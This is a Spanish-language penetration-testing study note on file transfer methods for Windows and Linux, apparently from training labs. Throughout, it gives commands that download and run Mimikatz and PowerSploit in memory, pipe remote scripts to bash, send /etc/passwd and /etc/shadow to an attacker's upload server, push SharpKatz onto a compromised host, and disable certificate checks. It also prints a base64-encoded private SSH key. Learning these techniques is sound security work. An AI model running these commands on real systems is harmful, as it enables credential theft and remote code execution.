#by d4l1

<h1 align="center">TRANSFERENCIA DE FICHEROS</h1>

Tenemos muchos escenarios donde utilizaremos esto y debemos entenderlo.

Entenderemos diferentes formas de transferir archivos y como las redes operar y nos pueden ayudar durante nuestro paso.

Debemos entender que muchos sistemas operativos o adminstradores nos pueden bloquear depende lo que hagamos.

Aprenderemos tecnicas de Windows y linux.

## INTRODUCCION

EL sistema operativo windows tiene muchas versiones y difernetes utilidades para hacer operaciones de transferencia

Normalmente un ataque sigue estos pasos: 
1- Link malicioso
2- Execucion de codigo 
3 - Descargar de codigo malicioso

## POWERSHELL BASE64 ENCODE & DECODE

Dependiendo del tamaño del archivo a transferir, podemos utilizar metodos diferentes que no necesitan una conexion de red.
SI nosotros tenemos acceso a una teminal podremos cifrar un archivo en base64, copiando el contenido y haciendo la operacion reversa y cogiendo el contenido original.

Un uso esencial es utilizar un metodo que sea coorrecto. "md5sum" un programa que verifica hashes  "checksums" y es compacta y ligera

### PWNBOX Check SSH key
```
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```
Para cifrar
```
cat id_rsa |base64 -w 0;echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo
```
Copiamos el contenido dentro de la powershell de windows para decodificarlo. 
```
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
Finalmente ocnfirmamos que todo ha funcionado correctamente porque el hash nos dice que es ese.
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## POWERSHELL DESCARGAS DE WEB
Las compañias utilizan "HTTP" y "HTTPS" para el trafico en red y utilizan un "firewall". Estos son metodos de transferencia muy convenientes. 


Powershell nos da muchas opciones para descargar ficheros desde aqui

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/06bfaebc-59a9-4066-8e91-2a39fe57df46)

Vamos a ver ejemplos, especificamos una clase "Net.WebClient" y en el metodo "DownloadFile" con los parametros correspondientes de la URL para descargar bien el archivo

```
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### POWERSHELL METODO FILELESS

Los ataques archivos funciona descargando el payload y ejecutando directamente, nosotros podemos ejecutar en memoria usando la "Invoke-Expression"

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### INVOKE-WebREQUEST

```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
### ERRORES COMUNES CON POWERSHELL

EN muchos caos tendremos problemas con Internet Explorer 

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/c682319d-b612-4bda-a8a6-262efb442fc2)

Esto se puede bypasear: 
```
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error son relatar SSL/TLS certificados no confiables
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## DESCARGAR POR SMB

El protocolo de mensajes de servidor o (SMB) funciona en el puerto 445 es comun utilizarla en redes que utilizan Windows. para transferir remotamente ficheros entre servidores.

Nosotros podemos usar SMB para descargar ficheros de nuestra Pwnbox. Nosotros necesitamos crear un servidor SMB en nuestro Pwnbox con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) y entonces copiar y mover las conexiones.

### CREAR UN SERVIDOR SMB

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
````

Para descargar o copiar etc :
```
copy \\192.168.220.133\share\nc.exe
```

### CREAR UN SERVIDOR SMB CON USUARIO Y CONTRASEÑA

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### MONTAR UN SERVIDOR SMB CON USUARIO Y CONTRASEÑA

```
net use n: \\192.168.220.133\share /user:test test
```

## DESCARGAS POR FTP

Otra forma de transferir archivos es usando "FTP" que funciona por el puerto 21 y 20. Podemos usar el cliente FTP o PowerSHell Net.WebCLient para descargar ficheros del servidor FTP.

Podemos configurar el servidor FTP para que use Python3. Puediendo instalarlo con este comando:

```
sudo pip3 install pyftpdlib
```
Nosotros especificamos el puerto 21 porjemeplo, y deberiamos quitar la configuracion de inicio por Anonymous.

### CONFIGURAR UN SEVIDOR FTP POR PYTHON3

```
sudo python3 -m pyftpdlib --port 21
```

Despues de ejecutarlo, nosotros podemos usar cosas predefinidas.

### TRANSFERIR ARCHIVOS DEL SERVIDOR FTP USANDO POWER SHELL
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
Cuando tenemos una shell remota, no podemos interactuar con la shell, Si no es el caso, podemos crear comandos FTP para descargar el ficero, nosotros necesitamos crear un archivo con contenido de los camanos que luego queremos ejecutar.

### CREAR COMANDOS PARA EL CLIENTE FTP

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### SUBIR OPERACIONES

Hay algunas situaciones en las que el crackeo de contraseñas, analisis, filtracion, etc. Deberemos subir archivos a nuestra máquina victima. Podemos usar metodos apra descargar pero ahroa para subir

### POWERSHELL BASE&$ ENCODE Y DECOSE

### CODIFICAR USANDO POWER SHELL
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### DECODIFICAR USANDO LINUX

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```
```
md5sum hosts
```

### SUBIR WEB POR POWERSHELL

Powershell no tiene una funcion para subir operaciones, pero nosotros podemos invocalor y construirlo. Ncesitamos un servidor que deje subri archivos

Por ejemplo tenemos eso en un hyyp

### INSTALAR Y CONFIGURAR WEBSERVER CON SUBIR ARCHIVOS

```
pip3 install uploadserver
python3 -m uploadserver
```

Ahora podemos usar el script de PowerSHell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) para hacerptar los parametro -File y -Uri para subir archivos

### SCRIPT UPLOAD

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### POWERSHELL WEB UPLOAD

Otra forma de usar poweshell y base64 es con el post

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Podemos hacer un netcat para conectarnos

```
nc -lvnp 8000
```
### SMB UPLOADS

Anteriormente vimos el trafico en el HTTP o HTTPS 80 y 443 comunmente el SMB funciona en el 445 dentro de nuestra red podemos sufrir ataques potenciales.

Otra alternativa en funcionar SMB con la extension HTTP para comunicarse entre ellos

Cuando usamos SMB hay una conexion por dicho protocolo si nos intentacmos conectar po HTTP en wireshark lo podemos ver.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/8a6e3cda-f5e6-457d-81b3-cef3c6f47921)

## CONFIGURAR WEBDAV SERVER

NEcesitaremos instalar los modulos de python "wsgidav" y "cheroot" 

### INSTALAR

```
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```
dir \\192.168.49.128\DavWWWRoot
```
### SUBIR ARCHIVOS USANDO SMB

```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP UPLOADS

Subir archivos usando FTP es muy simlitar a descargarlos. 
```
sudo python3 -m pyftpdlib --port 21 --write
```
### DESDE POWERSHEll
```
 (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

# METODOS DE TRANFERENCIA DE ARCHIVOS EN LINUX

Linux es un sistema operativo versatil (el mejor), comunmente se utiliza para diferentes herramientas que nosotros usamos para llevar a cabo. Entendiendo como se transfieren archivos en linux entenderemos como los atacante y como ayudarnos como defensores.

Hace unos años, nosotros contactabamos para tener respuestas a incidentes en los servidores web. Nostros buscamos multiples trucos. 

EL script en Bash se como metodo para descargar una pequeña pieza de amlware para conectarnos remotamente y tener control del servidor. Una vez que usamos cURL podemos usar wget o si no pyhon.

Linux puede comunicarse en FTP, SMB como Windows, muchos malware utilizan diferentes sistemas operativos usando HTTP y HTTPS para la comunicación. 

## OPERADORES DE DESCARGA

Nosotros tenemos acceso a una maquina, y queremos o necseitamos descargar un fichero. Vamos a ver como se haria.

### BASE&$ ENCODING / DECODING

Dependiendo el tamaño del fichero a transferir, nosotros usamos un metodo que no requira conexion. Si tenemos acceso a la terminal podemos encodear y copiar el contenido y asi reversivamente apra comprobarlo

```
md5sum id_rsa - chekea el archivo
```
Podemos usar "cat" para ver el contenido
```
cat id_rsa |base64 -w 0;echo
```

Nosotros copiamos el contenido y lo podemos decodificar 
```
echo -m 'code' | base64 -d > id_rsa
```

Y finalmente confirmamos que todo esta correcto por el hash
```
md5sum id_rsa
```

### DESCARGAS DE WEB POR WGET Y CURL

Las mas comunes utilidades en las distribuciones de Linux es como interactua con las aplicaciones web son wget y curl. Estas herramientas estan instalar en las distribuciones de linux

Para descargar una archivo usando "wget", necesitamos especificar la URL -O para un output
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
el curl es muy similar lo unico que la -o es en minuscula
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### FIELESS ATTACKS USANDO LINUX

Por una de las formas de linux funciona, muchas herramientas que nosotros usamos en linux se usan para replicar operaciones.

Vamos a utilziar el "curl" anteiormrente usando y descargarlo
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
Podemos deacrgar un script en python para el servidor web.
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
### DESCARGAR CON BASH /DEV/TCP

En muchas situaciones deberas utilizar esta version.
```
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

## DESCARGAS POR SSH

SSH (Secure Shell) es un protocolo de acceso seguro a los ordenadores remotamente. La implementación de ssh es con SCP

SCP (Secure Copy) es una linea de comando y una utilidad en la que se copian ficheros y directorios entre host seguros. Podemos copiar nuestros ficheros localmente a servidores remotos.

SCP es muy similar para "copy" o "cp" una vez que esta en una ruta local, nosotros necseitamos especificar el usuario, la IP o DNd y las credenciales

Antes de descargar deveremos lanzar un servidor SSH

```
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt
```

### DESCARGAR FICHEROS USANDO SCP

```
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## SUBIR OPERACIONES

Hay muchas opciones o situaciones que podemos capturar paquetes, deberemos subir archivos del target a nuestro o viceversa.

### WEB UPLOADS

Anteriormente mencionado en el "windows file transfeR" podemos subir archivos al servidor con un modulo por python por ejemplo.

```
sudo python3 -m pip install -user uploadserver
```

### CREAR UN CERTIFICADO

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
### EMPEZAR WEB SERVER

```
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

vanis a subir archivos /etc/passwd y /etc/shadow

### SUBIR MULTIPLES ARCHIVOS

```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opcion --insecure porque nosotros usamos la misma certificacion que hemos creado y es insegura

### FORMAS ALTERNATIVAS DE TRANSFERIR ARCHIVOS

Las distribuciones de linux usualmente usan Python o php instalado, para empezar a hacerlo, y nuestro servidor tiene un web server, podemos mover archivos qu ueramos entre directorios.

Es posible que pueda usar varios lenguajes. 

### CREAR UN WEB SERVER CON PYTHON3

```
python3 -m http.server puerto
```
### CON PHP
```
php -s 0.0.0.0:8000
```
### RUBY
```
ruby -run -ehttpd . -p8000
```
### DESCARGAR UN FICHERO DE LA MÁQUINA

```
wget 192.168.49.128:8000/filetotransfer.txt
```

### SUBIDA DE ARCHIVOS CON SCP

Muchas compañias utilan ssh (22) para las conexiones y para subir archivos necesitaremos scp

```
 scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# TRANSFERIR ARCHIVOS CON CODIGO

Es muy comun que en diferentes lenguajes de programacion. Como Python,PHP,Perl y ruby esten en linux o windows.

Usaremos aplicaciones predefinidar de windows y linux

## PYTHON

Es un lenguaje de programación famoso version 3 

### DESCARGAR
```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
## PHP
Transferencia de multiples archivos se usa el 77 porciento de las ocasiones en servdores.
Ejemplos
```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### OTROS LENGUAJES

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JAVA SCRIPT

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

## VBScript

VBScript ("Microsoft Visual Basic Scripting Edition") 

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
### SUBIR OPERACIONES CON PYTHON 3

Si queremos subir un archivo, debemos entender como funciona

```
python3 -m uploadserver
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/d86a6599-be84-4baf-917f-bd80cd8f32fd)

# OTRAS FORMAS DE TRANSFERENCIA DE ARCHIVOS

Ya hemos comentado varias formas sea windows os linux. Hasta usando diferentes lenguajes de programación.

En esta sección trataremos usando Netact, Ncat y usando RDP

## NETCAT

Abreviación de nc es una utilizar del ordenador en red para leer y escribir utilziando conexion TCP o UDP para transferir operaciones.

### TRANSFERENCIA CON NETCAT Y NCAT

El target se usa para iniciar la conexion, el firewall previene el acceso

EN este ejemplo equeremos meter un .exe para compremeter el archivos. Tenemos dos metodos

Primero usando Netcat (nc) con la opcion -l y el puerto -p 8000 y redirigiendo

```
nc -l -p 8000 > SharpKatz.exe
```
Podemos especificar "--recv-only" para cerrar la conexion
```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Del host atacante, nosotros podemos conectarnos en el puerto 8000 usando netcan y mandando ficheros con la opcion -q 0 le dices a netcat que cierre la conexión al final.

### Netcat - Mandar ficheros para comprometer una maquina

```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

utilizando Ncat en nuestra maquina host, nosotros optamos por "--send-only" solo lo manda una veez apra que no reviente
```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Una vez que la maquina esta comprometia, nosotros nos conectamos por el puerto para transferir archivos y poner un litsner 
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
nc 192.168.49.128 443 > SharpKatz.exe
```

### MANDAR FICHEROS CON NCAT
```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
### RECIBIR ARCHIVO
```
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

### NETCAT MANDAR FICHERO TO NETCAT

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## POWERSHELL TRANSFERENCIA DE SESION

Vamos a hablar sobre hacer transfeencia de archivos con powerhsell, pero hay muchos mas escenarios como HTTP, HTTPS o MSB que estan validos, en este caso, nosotros usamos "Remoting PowerShell" (WinRM) para transferir.

El powerShell rmeoto hacer que podamos ejecutar scripts o comandos en un ordenador remoto usando una sesion de PowerShell. Los administradores comunmente usamos remotamente PowerShell para manejar remotamente los rodenadores de lared, y nosotros transferimos las operaciones, 

Para crear una powershell remota en un ordeandor remoto, necesitaremos acceso de adminsitrador , los miembros de grupo necesitara permisos explicitos, vamos a crear una transferecia de ficheros.

Tenemos uan sesión de adminsitrador, el usuaro administrar y el powershell remoting es enable

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/bdb59dcc-7806-4d1f-b06c-7ef770d933a5)

No especifica credenciales vamos a crear un ordenador remoto
```
$Session = New-PSSession -ComputerName DATABASE01
```
Usaremos "Copy-Item" de nuestra máuqina local para hacer una sesion
```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

Es comunmente usado para acceder remotamente a las redes de windows. Podemos trasferir copiar, pegar, etc. 

Si estamos conectados desde linux, tenemos xfreerdp o rdesktop. 

```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/6fd3bae4-1e24-4421-a7ff-a90d8d38f07e)

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/45fb7b1c-c39b-4f86-9376-f82ea680ff13)

## PRACTICE MAKES PERFECT

Es rentable que en esta scecion creemos nuestras propias notas y tecnicas

1- Active directory
2- Pivoting, Tunelling y Port Forwarding
3- Ataque de redes
4 - Shell y payloads

# PROTECCIÓN EN LA TRASFERENCIA DE FICHEROS

Un penetration testes, puede tener acceso y ganar datos sensibles, credenciales etc, Es esencial encriptar la informacion y utilizar conexiones de SSH,SFTP y HTTPS.

Antes, los datos encriptados y arhcivos antes de la transferencia necesitaban estar prevenidos 

Durante un test de pentracion, debes actuar como profesional.

## ENCRIPTACION EN WINDOWS

Muchos metodos diferentes se usan para encriptar ficheros y informacion de los sistemas Windows. Un metodo simple es con [Invoke-AESEcmoto](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) es un script en PowerShell. Provee una encriptación a los archivos

### IMPORTAR MODULO

```
Import-Module .\Invoke-AESEncryption.ps1
```
Después de que el script sea importado, se puden encriptar archivos o ficheros, y veremos ejemplos, con la extension ".aes"

```
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
Usando contraseñas fuertes y unicas es muy importante. Y más en archivos sensibles y información que no pueda ser desencriptada con una simple contraseña.

## ENCRIPTACIÓN EN LINUX

Usualmente se incluye "OpenSSL" en las distribuciones Linux, con sysadmin se usa para genera certificados, se puede usar "nc style" para mandar ficheros encriptados.

Para encriptar un fichero usando "openssl" selecionaremos el tipo de ciprado por ejemplo "-aes256" una itinerancia "-iter 100000" y la contraseña que usaremos "-pbkdf2" 

```
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

Recuerda que contra mas dificil sea la contraseña menos posibilidades para ataques de fuerza bruta.

### DESENCRIPTAR PASSWD.enc CON OPENSSL

```
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Nosotros podemos usar otros metodos de transferencia de archivos, pero es recomendable utilizar metodos HTTPS, SFTP o SSH siempre.

## COGER ARCHIVOS DE HTTP/S

La transferencia web es muy comun entre archivos porque HTTP/HTTPS es el protocolo más comun que pasa por los firewalls. Otro beneficio inmenso, en muchos casos, que los archivos van encriptados en transito. Esto es malo para los penetration tester, y clientes de red IDS que mandan o transfieren archivos sensibles o en texto plano como contraseñas sin encriptar.

